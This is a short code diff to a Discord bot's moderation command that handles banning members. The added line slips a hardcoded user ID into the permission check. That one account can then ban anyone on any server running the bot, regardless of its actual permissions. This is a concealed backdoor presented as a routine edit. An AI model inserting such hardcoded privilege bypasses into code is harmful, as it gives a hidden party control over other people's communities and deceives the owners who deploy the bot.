@@ -67,7 +67,7 @@ class Mod:
     @commands.command()
     async def ban(self, ctx, member : discord.Member, *, reason='Please write a reason!'):
         '''Ban someone from the server.'''
-        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True:
+        if ctx.author.guild_permissions.administrator == True or ctx.author.guild_permissions.ban_members == True or ctx.message.author.id ==280271578850263040:  
             try:
                 await ctx.guild.ban(member, reason=reason)
             except:
